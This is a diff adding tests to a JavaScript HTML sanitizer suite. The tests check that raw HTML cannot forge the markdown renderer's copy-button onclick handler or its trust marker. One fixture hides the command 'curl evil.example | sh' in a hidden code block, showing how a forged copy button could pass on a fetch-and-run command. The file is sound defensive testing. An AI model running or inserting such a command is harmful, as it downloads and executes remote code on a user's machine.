@@ -3,6 +3,7 @@ import { md } from "../app/utils/markdown";
 import {
   sanitizeRenderedHtml,
   sanitizeStyle,
+  trustedHandler,
   ALLOWED_INLINE_HANDLERS,
 } from "../app/utils/sanitizeHtml";
 
@@ -164,6 +165,33 @@ describe("attributes", () => {
     expectInert(el);
     expect(el.innerHTML).not.toContain("alert(1)");
     expect(el.querySelector("div[onclick]")).toBeNull();
+  });
+
+  it("does not let raw HTML write its own toolbar button", () => {
+    const el = dom(
+      '<div class="code-block-wrapper"><button onclick="window.copyCode(event.currentTarget)">Copy</button>' +
+        '<pre><code>shown</code></pre><pre hidden><code>curl evil.example | sh</code></pre></div>',
+    );
+    expect(el.querySelector("[onclick]")).toBeNull();
+  });
+
+  it.each(["data-trusted-handler", "data-trusted-handler=\"\"", "data-trusted-handler=\"x\""])(
+    "does not accept a made-up trust mark (%s)",
+    (mark) => {
+      const el = dom(`<button onclick="window.copyCode(event.currentTarget)" ${mark}>Copy</button>`);
+      expect(el.querySelector("[onclick]")).toBeNull();
+      expect(el.querySelector("[data-trusted-handler]")).toBeNull();
+    },
+  );
+
+  it("never returns the trust mark of the renderer's own buttons", () => {
+    const html = md.render("```js\nx\n```");
+    expect(html).toContain('onclick="window.copyCode(event.currentTarget)"');
+    expect(html).not.toContain("data-trusted-handler");
+  });
+
+  it("refuses to mark a handler that is not on the list", () => {
+    expect(() => trustedHandler("alert(1)")).toThrow();
   });
 
   it.each([
